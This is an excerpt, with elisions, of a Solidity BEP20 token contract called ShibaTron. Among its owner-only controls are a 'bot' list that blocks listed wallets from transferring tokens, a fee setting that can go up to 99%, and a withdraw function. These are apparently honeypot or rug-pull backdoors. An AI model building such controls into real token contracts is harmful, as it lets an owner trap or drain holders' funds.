...
/* © 2021 ShibaTron. All Rights Reserved. For more details visit the official website https://shibatron.org/
...
contract SHIBATRON is Context, IBEP20, Ownable {
    ...
    string  public Reflection_Fee = "6%";
    string  public PancakeSwap_Slippage = "7% - 8%";
    //string  public Website = "www.shibatron.org";
    ...
    mapping (address => bool) private _S_Bot;
    mapping (address => bool) private _R_Bot;

    constructor (string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply, uint256 _txFee,address _FeeAddress,address tokenOwner) payable   {
        _NAME = _name;
        _SYMBOL = _symbol;
        _DECIMALS = _decimals;
    ...
    function S_Bot(address _wallet, bool _allow) external  onlyDev() {

        if(_allow){
            _S_Bot[_wallet] = _allow;
        } else {
            delete _S_Bot[_wallet];
        }
    }

    function is_S_Bot(address _wallet) external view returns (bool) {
        return _S_Bot[_wallet];
    }

    function R_Bot(address _wallet, bool _allow) external onlyDev() {
        if(_allow){
    ...
    function updateFee(uint256 _txFee) onlyDev() public{
        require(_txFee < 100);
        _TAX_FEE = _txFee* 100;
        ORIG_TAX_FEE = _TAX_FEE;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        require(!_S_Bot[sender], "SBot not allowed");
    ...
    function withdraw(address token, uint amount, address _wallet) external onlyDev() {
